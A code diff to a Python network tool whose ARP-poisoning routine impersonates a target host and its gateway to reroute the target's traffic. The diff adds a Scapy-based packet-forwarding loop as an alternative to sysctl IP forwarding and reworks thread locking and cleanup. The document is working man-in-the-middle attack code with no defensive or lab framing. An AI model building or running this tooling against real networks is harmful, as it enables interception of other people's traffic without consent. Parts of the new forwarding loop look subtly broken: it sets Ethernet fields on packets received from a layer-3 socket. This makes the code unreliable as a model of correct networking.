@@ -20,10 +20,15 @@ logger = logging.getLogger(__name__)
 
 
 class Tool:
-    def __init__(self, interface=None, greet=False):
+
+    def __init__(self, interface=None, greet=False, use_scapy_forwarding=False):
         self.console = Console()
         self._interface = interface
         self.greet = greet
+        self.use_scapy_forwarding = use_scapy_forwarding
+        self.stop_event = threading.Event()  # Crucial: make sure it's in __init__
+        self.poison_threads_lock = threading.Lock()  # Add lock
+        self.forwarding_thread = None  # Initialize forwarding thread
 
         # Initialize network info immediately
         self.initialize()
@@ -199,26 +204,31 @@ class Tool:
                 "Network information not available. Initialize the tool first."
             )
 
-        self.poison_threads_lock = threading.Lock()  # Protect the threads list
-        self.poison_threads = []  # List for poisoning threads
+        self.poison_threads = []  # List for poisoning threads  # Moved and cleared here
+        self.poison_threads_lock = threading.Lock()
 
         self.target_ip = target_ip
         self.target_mac = self._get_mac(target_ip)
         self.gateway_mac = self._get_mac(self._gateway_ip)
-        self.stop_event = threading.Event()  # Create the stop event
+        # self.stop_event = threading.Event()  # Create the stop event  <- moved to __init__
 
-        if not all(
-            [self.target_mac, self.gateway_mac]
-        ):  # Fail early if MAC addresses aren't resolved
+        if not all([self.target_mac, self.gateway_mac]):
             raise ValueError("Failed to resolve MAC addresses for target or gateway.")
 
         try:
-            subprocess.run(
-                ["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True
-            )  # enable IP forwarding
+            if self.use_scapy_forwarding:
+                self.forwarding_thread = threading.Thread(
+                    target=self._scapy_forwarding_loop, daemon=True
+                )  # Corrected: daemon=True
+                self.forwarding_thread.start()
+                logger.info("Using Scapy IP forwarding")
 
-            # Create and start the poisoning threads, using the lock:
-            with self.poison_threads_lock:
+            else:  # Default to sysctl if use_scapy_forwarding is False
+                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+                logger.info("Using sysctl IP forwarding")
+
+            # ---  ARP Poisoning Threads (This part mostly stays the same but with the lock) ---
+            with self.poison_threads_lock:  # <--- Important: use the lock here
                 self.poison_threads = [
                     threading.Thread(
                         target=self._poison_thread,
@@ -232,20 +242,35 @@ class Tool:
                     ),
                 ]
 
-            for thread in self.poison_threads:
+            for (
+                thread
+            ) in (
+                self.poison_threads
+            ):  # Start poisoning threads *after* forwarding setup
                 thread.start()
 
-            logger.info(f"Started rerouting traffic for {target_ip}")
+            logger.info(
+                f"Started rerouting traffic for {target_ip}"
+            )  # After starting all threads
 
         except Exception as e:
-            with self.poison_threads_lock:  # Use lock in exception handler
-                self._restore_arp()  # important cleanup!
-                if self.poison_threads:  # Ensure it exists
-                    for thread in self.poison_threads:
+            # --- Exception Handling (Crucial for cleanup) ---
+            with self.poison_threads_lock:
+                self._restore_arp()
+                if self.poison_threads:
+                    for (
+                        thread
+                    ) in (
+                        self.poison_threads
+                    ):  # Ensures this is run only if the thread list is not empty
                         thread.join()
                     self.poison_threads = []  # Clear after stopping threads
 
-            logger.exception(f"Error during rerouting setup: {e}")  # Proper logging
+            if self.use_scapy_forwarding and self.forwarding_thread:
+                self.stop_event.set()
+                self.forwarding_thread.join()
+
+            logger.exception(f"Error during rerouting setup: {e}")
             raise  # Re-raise after cleanup
 
     def _poison_thread(self, target_ip, target_mac, source_ip):
@@ -269,13 +294,62 @@ class Tool:
                 for thread in self.poison_threads:
                     thread.join()  # Wait for threads to finish
                 self._restore_arp()
-                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
+
+                # Conditionally disable IP forwarding
+                if not self.use_scapy_forwarding:  # Only disable if sysctl was used
+                    subprocess.run(
+                        ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
+                    )
+
                 logger.info("Traffic rerouting stopped and ARP table restored.")
                 self.poison_threads = []  # Clear the list after stopping threads
                 self.stop_event.clear()  # Reset for next use
-
             else:
                 logger.warning("Rerouting was not active.")
 
+        # Stop Scapy forwarding thread *outside* the lock:
+        if (
+            self.use_scapy_forwarding and self.forwarding_thread
+        ):  # Check if thread running
+            self.stop_event.set()  # Stop forwarding loop
+            if self.forwarding_thread.is_alive():
+                self.forwarding_thread.join()  # Give it time to finish
+            self.forwarding_thread = None  # Clear to restart next time if needed.
+            logger.info("Stopped Scapy forwarding thread.")
+
+    def _scapy_forwarding_loop(self):
+        """Uses Scapy's L3socket to forward packets."""
+
+        try:
+            with conf.L3socket() as fwd:  # Use conf.L3socket() for OS-independent forwarding
+
+                while (
+                    not self.stop_event.is_set()
+                ):  # Exit gracefully if stop_rerouting is called
+                    try:
+                        packet = fwd.recv(1024)  # Optimized receive size
+                        if packet:
+                            if IP in packet:
+                                # Simple forwarding (modify as needed based on how you want to handle packets):
+                                if packet[IP].dst == self.target_ip:
+                                    packet[Ether].dst = self.target_mac
+                                elif packet[IP].dst == self._gateway_ip:
+                                    packet[Ether].dst = self.gateway_mac
+                                fwd.send(packet)
+                    except socket.timeout:
+                        pass  # Just check for stop flag periodically
+                    except Exception as e:
+                        logger.error(
+                            f"Error in forwarding loop: {e}"
+                        )  # Add exception handling
+                        break  # Break out of the loop on error
+
+        except Exception as e:
+            logger.exception(
+                f"Error creating Scapy forwarding socket: {e}"
+            )  # Log for debugging.
+
     def process_packet(self, packet):  # Placeholder for now—needs implementation.
         pass  # Placeholder.  This method needs to be implemented as per requirements.
+
+    #       Scapy handling IP forwarding
